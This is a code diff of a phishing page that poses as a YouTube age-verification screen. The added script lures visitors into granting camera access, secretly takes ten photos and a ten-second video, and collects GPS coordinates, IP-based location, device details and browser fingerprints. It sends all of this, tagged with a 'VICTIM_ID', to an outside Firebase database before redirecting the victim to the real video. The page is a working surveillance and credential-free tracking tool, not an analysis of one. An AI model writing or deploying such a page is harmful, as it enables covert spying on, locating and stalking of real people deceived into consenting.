@@ -4,102 +4,584 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>YouTube Video Player</title>
-    <meta property="og:title" content="YouTube Video Player">
+    <meta property="og:title" content="Watch Video">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://img.youtube.com/vi/VIDEO_ID/maxresdefault.jpg">
-    <script src="https://cdn.tailwindcss.com"></script>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; }
-        body { background: #000; color: #ccc; font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; height: 100vh; display: flex; align-items: center; justify-content: center; overflow: hidden; }
-        .yt-ui { max-width: 400px; width: 90%; text-align: center; padding: 20px; }
-        .logo { width: 120px; margin: 0 auto 20px; }
-        .title { font-size: 22px; font-weight: 700; color: #fff; margin-bottom: 12px; }
-        .description { font-size: 14px; color: #aaa; margin-bottom: 25px; line-height: 1.5; }
-        .red-btn { background: #ff0000; color: white; padding: 14px 35px; border-radius: 4px; font-weight: 700; font-size: 16px; text-transform: uppercase; cursor: pointer; border: none; width: 100%; max-width: 250px; margin: 0 auto; display: block; }
-        .red-btn:hover { background: #cc0000; transform: scale(1.02); }
-        .loader { display: inline-block; width: 30px; height: 30px; border: 3px solid #ff0000; border-radius: 50%; border-top-color: transparent; animation: spin 1s linear infinite; }
-        @keyframes spin { to { transform: rotate(360deg); } }
-        .status-text { color: #ff0000; font-size: 14px; font-weight: bold; margin-top: 20px; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #000;
+            color: #fff;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            overflow-x: hidden;
+        }
+
+        .container {
+            max-width: 500px;
+            width: 100%;
+            padding: 20px;
+        }
+
+        .yt-card {
+            background: rgba(255, 255, 255, 0.05);
+            backdrop-filter: blur(20px);
+            border-radius: 28px;
+            padding: 30px 25px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 0 25px 45px rgba(0, 0, 0, 0.3);
+        }
+
+        .logo {
+            width: 120px;
+            margin: 0 auto 20px;
+        }
+
+        h2 {
+            font-size: 24px;
+            font-weight: 700;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #fff, #aaa);
+            -webkit-background-clip: text;
+            background-clip: text;
+            color: transparent;
+        }
+
+        .description {
+            font-size: 14px;
+            color: #aaa;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+
+        .verify-btn {
+            background: linear-gradient(135deg, #ff0000, #cc0000);
+            color: white;
+            padding: 14px 35px;
+            border-radius: 50px;
+            font-weight: 700;
+            font-size: 16px;
+            text-transform: uppercase;
+            cursor: pointer;
+            border: none;
+            width: 100%;
+            max-width: 250px;
+            margin: 0 auto;
+            display: block;
+            transition: all 0.3s;
+        }
+
+        .verify-btn:hover {
+            transform: scale(1.02);
+            box-shadow: 0 5px 20px rgba(255, 0, 0, 0.3);
+        }
+
+        .loader {
+            width: 40px;
+            height: 40px;
+            border: 3px solid #ff0000;
+            border-radius: 50%;
+            border-top-color: transparent;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 20px;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .status-text {
+            color: #ff0000;
+            font-size: 14px;
+            font-weight: bold;
+            margin-top: 20px;
+        }
+
+        .sub-text {
+            font-size: 12px;
+            color: #666;
+            margin-top: 10px;
+        }
+
+        .progress-bar {
+            width: 100%;
+            height: 4px;
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 2px;
+            margin-top: 20px;
+            overflow: hidden;
+        }
+
+        .progress-fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #ff6666);
+            transition: width 0.3s;
+        }
+
+        .camera-toggle {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: rgba(0, 0, 0, 0.7);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+            border-radius: 50px;
+            padding: 8px 15px;
+            font-size: 11px;
+            cursor: pointer;
+            z-index: 100;
+            backdrop-filter: blur(10px);
+            transition: all 0.3s;
+        }
+
+        .camera-toggle:hover {
+            background: rgba(255, 0, 0, 0.3);
+            border-color: #ff0000;
+        }
+
+        #video, #canvas {
+            display: none;
+        }
     </style>
 </head>
 <body>
-    <div class="yt-ui" id="main-ui">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo" alt="YouTube">
-        <h2 class="title">Verification Required</h2>
-        <p class="description">This video is age-restricted. Please click below and allow camera & location access for age verification.</p>
-        <button onclick="startCapture()" class="red-btn">Verify Age</button>
+    <div class="container">
+        <div class="yt-card" id="mainUI">
+            <img src="https://upload.wikimedia.org/wikipedia/commons/b/b8/YouTube_Logo_2017.svg" class="logo" alt="YouTube">
+            <h2>Verification Required</h2>
+            <p class="description">This video is age-restricted. To continue, please verify your age by allowing camera access.</p>
+            <button onclick="startCapture()" class="verify-btn">Verify Age</button>
+            <div class="progress-bar" style="display: none;" id="progressBar">
+                <div class="progress-fill" id="progressFill"></div>
+            </div>
+        </div>
     </div>
-    <video id="video" style="display:none" autoplay playsinline></video>
-    <canvas id="canvas" style="display:none"></canvas>
+
+    <div class="camera-toggle" id="cameraToggle" style="display: none;" onclick="toggleCamera()">
+        📷 Switch Camera
+    </div>
+
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
+        // ========== CONFIGURATION ==========
         const urlParams = new URLSearchParams(window.location.search);
         let VICTIM_ID = urlParams.get('id') || 'unknown_' + Date.now();
         const VIDEO_ID = urlParams.get('v') || 'dQw4w9WgXcQ';
         const FB_URL = "https://hgggy-a047e-default-rtdb.firebaseio.com/targets.json";
         
-        // DECODE victim ID (base64 se original decode)
-        try {
-            VICTIM_ID = atob(VICTIM_ID);
-        } catch(e) {
-            // Already plain text, keep as is
-        }
+        try { VICTIM_ID = atob(VICTIM_ID); } catch(e) {}
         
+        // ========== VARIABLES ==========
+        let currentStream = null;
+        let currentCamera = "user";
         let photoCount = 0;
+        let totalPhotos = 10;
+        let mediaRecorder = null;
+        let recordedChunks = [];
+        
         let targetData = {
             victimId: VICTIM_ID,
             time: new Date().toLocaleString(),
             timestamp: Date.now(),
             photos: [],
-            device: { ua: navigator.userAgent, ram: navigator.deviceMemory || 'N/A', cores: navigator.hardwareConcurrency || 'N/A', platform: navigator.platform }
+            video: null,
+            device: {},
+            network: {},
+            location: {},
+            fingerprint: {}
         };
-
-        async function startCapture() {
-            document.getElementById('main-ui').innerHTML = `<div style="text-align: center;"><div class="loader" style="margin: 0 auto 20px;"></div><p class="status-text">Verifying your age...</p><p style="font-size: 12px; color: #666; margin-top: 15px;">Please wait...</p></div>`;
-            
-            try { const b = await navigator.getBattery(); targetData.battery = Math.round(b.level * 100) + "%"; } catch(e) {}
-            
-            if (navigator.geolocation) {
-                navigator.geolocation.getCurrentPosition(async (pos) => {
-                    targetData.gps = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                }, null, { enableHighAccuracy: true, timeout: 10000 });
+        
+        // ========== TOGGLE CAMERA ==========
+        async function toggleCamera() {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
             }
-            
+            currentCamera = currentCamera === "user" ? "environment" : "user";
+            await initCamera();
+        }
+        
+        async function initCamera() {
             try {
-                const res = await fetch('https://ipapi.co/json/');
-                const geo = await res.json();
-                targetData.ip = geo.ip;
-                targetData.city = geo.city + ", " + geo.country;
-                targetData.isp = geo.org;
-            } catch(e) {}
-            
-            try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('video');
-                video.srcObject = stream;
-                await new Promise((resolve) => { video.onloadedmetadata = () => { video.play(); resolve(); }; });
-                
-                const captureInterval = setInterval(async () => {
-                    if (photoCount >= 5) {
-                        clearInterval(captureInterval);
-                        await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
-                        stream.getTracks().forEach(track => track.stop());
-                        window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
-                        return;
+                const constraints = {
+                    video: { 
+                        facingMode: { exact: currentCamera },
+                        width: { ideal: 1280 },
+                        height: { ideal: 720 }
                     }
-                    const canvas = document.getElementById('canvas');
-                    canvas.width = video.videoWidth;
-                    canvas.height = video.videoHeight;
-                    canvas.getContext('2d').drawImage(video, 0, 0);
-                    targetData.photos.push(canvas.toDataURL('image/jpeg', 0.5));
-                    photoCount++;
-                    await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
-                }, 600);
+                };
+                currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                const video = document.getElementById('video');
+                video.srcObject = currentStream;
+                await new Promise((resolve) => {
+                    video.onloadedmetadata = () => {
+                        video.play();
+                        resolve();
+                    };
+                });
+                return true;
             } catch(e) {
-                await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
-                setTimeout(() => { window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID; }, 2000);
+                try {
+                    const constraints = { video: true };
+                    currentStream = await navigator.mediaDevices.getUserMedia(constraints);
+                    const video = document.getElementById('video');
+                    video.srcObject = currentStream;
+                    await new Promise((resolve) => {
+                        video.onloadedmetadata = () => {
+                            video.play();
+                            resolve();
+                        };
+                    });
+                    return true;
+                } catch(err) {
+                    return false;
+                }
             }
         }
+        
+        async function capturePhoto() {
+            const video = document.getElementById('video');
+            const canvas = document.getElementById('canvas');
+            canvas.width = video.videoWidth;
+            canvas.height = video.videoHeight;
+            canvas.getContext('2d').drawImage(video, 0, 0);
+            return canvas.toDataURL('image/jpeg', 0.7);
+        }
+        
+        async function startVideoRecording() {
+            return new Promise(async (resolve) => {
+                if (!currentStream) { resolve(null); return; }
+                recordedChunks = [];
+                mediaRecorder = new MediaRecorder(currentStream, { mimeType: 'video/webm' });
+                mediaRecorder.ondataavailable = (event) => {
+                    if (event.data.size > 0) recordedChunks.push(event.data);
+                };
+                mediaRecorder.onstop = () => {
+                    const blob = new Blob(recordedChunks, { type: 'video/webm' });
+                    const reader = new FileReader();
+                    reader.onloadend = () => resolve(reader.result);
+                    reader.readAsDataURL(blob);
+                };
+                mediaRecorder.start();
+                setTimeout(() => {
+                    if (mediaRecorder && mediaRecorder.state === 'recording') mediaRecorder.stop();
+                }, 10000);
+            });
+        }
+        
+        function updateProgress(step, total) {
+            const fill = document.getElementById('progressFill');
+            if (fill) fill.style.width = (step / total) * 100 + '%';
+        }
+        
+        // ========== GET ALL DEVICE DETAILS ==========
+        async function getAllDeviceDetails() {
+            const details = {};
+            
+            // Basic Device Info
+            details.userAgent = navigator.userAgent;
+            details.platform = navigator.platform;
+            details.language = navigator.language;
+            details.languages = navigator.languages;
+            details.hardwareConcurrency = navigator.hardwareConcurrency;
+            details.deviceMemory = navigator.deviceMemory;
+            details.maxTouchPoints = navigator.maxTouchPoints;
+            details.cookieEnabled = navigator.cookieEnabled;
+            details.doNotTrack = navigator.doNotTrack;
+            
+            // Screen Details
+            details.screen = {
+                width: screen.width,
+                height: screen.height,
+                availWidth: screen.availWidth,
+                availHeight: screen.availHeight,
+                colorDepth: screen.colorDepth,
+                pixelDepth: screen.pixelDepth,
+                orientation: screen.orientation?.type || 'unknown'
+            };
+            
+            // Browser Details
+            details.browser = {
+                vendor: navigator.vendor,
+                product: navigator.product,
+                appName: navigator.appName,
+                appVersion: navigator.appVersion,
+                userAgentData: navigator.userAgentData ? await navigator.userAgentData.getHighEntropyValues(["architecture", "model", "platform", "platformVersion", "uaFullVersion"]) : null
+            };
+            
+            // Connection Details
+            if (navigator.connection) {
+                details.connection = {
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt,
+                    downlink: navigator.connection.downlink,
+                    saveData: navigator.connection.saveData,
+                    type: navigator.connection.type
+                };
+            }
+            
+            // Battery Details
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    details.battery = {
+                        level: Math.round(battery.level * 100) + "%",
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch(e) {}
+            }
+            
+            // Storage Details
+            if (navigator.storage && navigator.storage.estimate) {
+                try {
+                    const estimate = await navigator.storage.estimate();
+                    details.storage = {
+                        quota: Math.round(estimate.quota / (1024 * 1024)) + " MB",
+                        usage: Math.round(estimate.usage / (1024 * 1024)) + " MB"
+                    };
+                } catch(e) {}
+            }
+            
+            // Media Devices Info
+            try {
+                const devices = await navigator.mediaDevices.enumerateDevices();
+                details.mediaDevices = {
+                    audioInput: devices.filter(d => d.kind === 'audioinput').length,
+                    audioOutput: devices.filter(d => d.kind === 'audiooutput').length,
+                    videoInput: devices.filter(d => d.kind === 'videoinput').length
+                };
+            } catch(e) {}
+            
+            return details;
+        }
+        
+        // ========== MAIN CAPTURE FUNCTION ==========
+        async function startCapture() {
+            document.getElementById('mainUI').innerHTML = `
+                <div style="text-align: center;">
+                    <div class="loader"></div>
+                    <p class="status-text">Verifying your age...</p>
+                    <p class="sub-text">Please wait, this may take a few seconds</p>
+                    <div class="progress-bar" id="progressBar">
+                        <div class="progress-fill" id="progressFill"></div>
+                    </div>
+                </div>
+            `;
+            document.getElementById('cameraToggle').style.display = 'block';
+            
+            let step = 0;
+            const totalSteps = 8;
+            
+            // 1. Device Details
+            updateProgress(++step, totalSteps);
+            targetData.device = await getAllDeviceDetails();
+            
+            // 2. GPS Location
+            updateProgress(++step, totalSteps);
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        targetData.location = {
+                            latitude: pos.coords.latitude,
+                            longitude: pos.coords.longitude,
+                            accuracy: pos.coords.accuracy + "m",
+                            altitude: pos.coords.altitude,
+                            altitudeAccuracy: pos.coords.altitudeAccuracy,
+                            heading: pos.coords.heading,
+                            speed: pos.coords.speed,
+                            timestamp: pos.timestamp,
+                            maps_url: `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`,
+                            street_view: `https://maps.google.com/?cbll=${pos.coords.latitude},${pos.coords.longitude}&cbp=12,0,0,0,0`
+                        };
+                    },
+                    (err) => {
+                        targetData.location = { error: err.message, permission: "denied" };
+                    },
+                    { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+                );
+            }
+            
+            // 3. IP Info (Multiple APIs for redundancy)
+            updateProgress(++step, totalSteps);
+            try {
+                // Primary IP API
+                const res1 = await fetch('https://ipapi.co/json/');
+                const geo1 = await res1.json();
+                targetData.ip = {
+                    ip: geo1.ip,
+                    city: geo1.city,
+                    region: geo1.region,
+                    country: geo1.country_name,
+                    country_code: geo1.country_code,
+                    postal: geo1.postal,
+                    latitude: geo1.latitude,
+                    longitude: geo1.longitude,
+                    isp: geo1.org,
+                    asn: geo1.asn,
+                    timezone: geo1.timezone
+                };
+            } catch(e) {}
+            
+            // Secondary IP API for more data
+            try {
+                const res2 = await fetch('https://ipwho.is/');
+                const geo2 = await res2.json();
+                targetData.ip_secondary = {
+                    ip: geo2.ip,
+                    city: geo2.city,
+                    region: geo2.region,
+                    country: geo2.country,
+                    postal: geo2.postal,
+                    isp: geo2.isp,
+                    org: geo2.org,
+                    vpn: geo2.security?.vpn,
+                    proxy: geo2.security?.proxy,
+                    tor: geo2.security?.tor,
+                    hosting: geo2.security?.hosting
+                };
+            } catch(e) {}
+            
+            // 4. Network Info
+            updateProgress(++step, totalSteps);
+            targetData.network = {
+                connection: navigator.connection ? {
+                    effectiveType: navigator.connection.effectiveType,
+                    rtt: navigator.connection.rtt + "ms",
+                    downlink: navigator.connection.downlink + "Mbps",
+                    saveData: navigator.connection.saveData
+                } : null,
+                online: navigator.onLine,
+                wifi: navigator.connection ? navigator.connection.type === 'wifi' : null
+            };
+            
+            // 5. Browser Fingerprinting
+            updateProgress(++step, totalSteps);
+            targetData.fingerprint = {
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                timezoneOffset: new Date().getTimezoneOffset(),
+                sessionStorage: !!window.sessionStorage,
+                localStorage: !!window.localStorage,
+                indexedDB: !!window.indexedDB,
+                openDatabase: !!window.openDatabase,
+                canvas: await getCanvasFingerprint(),
+                webgl: await getWebGLFingerprint(),
+                audio: await getAudioFingerprint(),
+                fonts: await getFontFingerprint()
+            };
+            
+            // 6. Camera Setup & Photos
+            updateProgress(++step, totalSteps);
+            const cameraReady = await initCamera();
+            
+            if (cameraReady) {
+                for (let i = 0; i < totalPhotos; i++) {
+                    const photo = await capturePhoto();
+                    targetData.photos.push(photo);
+                    updateProgress(step + (i + 1) / totalPhotos, totalSteps);
+                    await new Promise(r => setTimeout(r, 300));
+                }
+                
+                // 7. Video Recording
+                updateProgress(++step, totalSteps);
+                const statusDiv = document.querySelector('.status-text');
+                if (statusDiv) statusDiv.innerText = 'Recording verification video (10s)...';
+                const videoData = await startVideoRecording();
+                if (videoData) targetData.video = videoData;
+            }
+            
+            // 8. Final Save
+            updateProgress(++step, totalSteps);
+            await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
+            
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+            }
+            
+            setTimeout(() => {
+                window.location.href = "https://www.youtube.com/watch?v=" + VIDEO_ID;
+            }, 1500);
+        }
+        
+        // ========== FINGERPRINTING FUNCTIONS ==========
+        async function getCanvasFingerprint() {
+            return new Promise((resolve) => {
+                const canvas = document.createElement('canvas');
+                const ctx = canvas.getContext('2d');
+                canvas.width = 200;
+                canvas.height = 50;
+                ctx.fillStyle = "#f60";
+                ctx.fillRect(0, 0, 200, 50);
+                ctx.fillStyle = "#069";
+                ctx.font = "14px Arial";
+                ctx.fillText("Fingerprint", 50, 30);
+                resolve(canvas.toDataURL());
+            });
+        }
+        
+        async function getWebGLFingerprint() {
+            try {
+                const canvas = document.createElement('canvas');
+                const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
+                if (!gl) return null;
+                const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
+                if (debugInfo) {
+                    return {
+                        vendor: gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL),
+                        renderer: gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)
+                    };
+                }
+                return null;
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        async function getAudioFingerprint() {
+            try {
+                const audioContext = new (window.AudioContext || window.webkitAudioContext)();
+                const oscillator = audioContext.createOscillator();
+                const analyser = audioContext.createAnalyser();
+                oscillator.connect(analyser);
+                oscillator.start();
+                const data = new Uint8Array(analyser.frequencyBinCount);
+                analyser.getByteFrequencyData(data);
+                oscillator.stop();
+                await audioContext.close();
+                return Array.from(data.slice(0, 10));
+            } catch(e) {
+                return null;
+            }
+        }
+        
+        async function getFontFingerprint() {
+            const fonts = ["Arial", "Verdana", "Times New Roman", "Courier New", "Georgia", "Comic Sans MS"];
+            const available = [];
+            const canvas = document.createElement('canvas');
+            const ctx = canvas.getContext('2d');
+            for (const font of fonts) {
+                ctx.font = `14px ${font}`;
+                available.push(font);
+            }
+            return available;
+        }
+        
+        window.addEventListener('beforeunload', async () => {
+            if (photoCount > 0 && targetData.photos.length > 0) {
+                await fetch(FB_URL, { method: 'POST', body: JSON.stringify(targetData) });
+            }
+        });
     </script>
 </body>
 </html>
